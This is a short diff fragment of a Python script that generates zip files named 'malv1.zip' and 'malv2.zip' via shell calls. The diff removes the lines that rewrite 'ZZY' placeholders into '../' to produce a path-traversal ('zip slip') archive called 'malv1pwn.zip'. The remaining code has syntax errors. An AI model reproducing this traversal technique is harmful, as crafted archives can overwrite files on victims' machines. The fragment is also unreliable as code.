@@ -20,10 +20,7 @@ for i in range(1,lenght):
 os.system("zip -0 malv1.zip ZZY*") 
 os.system("zip malv2.zip ZZY*") 
 os.system("rm ZZY*"+file_name+)
-with open("malv1.zip","rb")as f:
-    v1 = f.read()
-    with open("malv1pwn.zip","wb") as f:
-      f.write(v1.replace("ZZY","../")
+
  
       
     
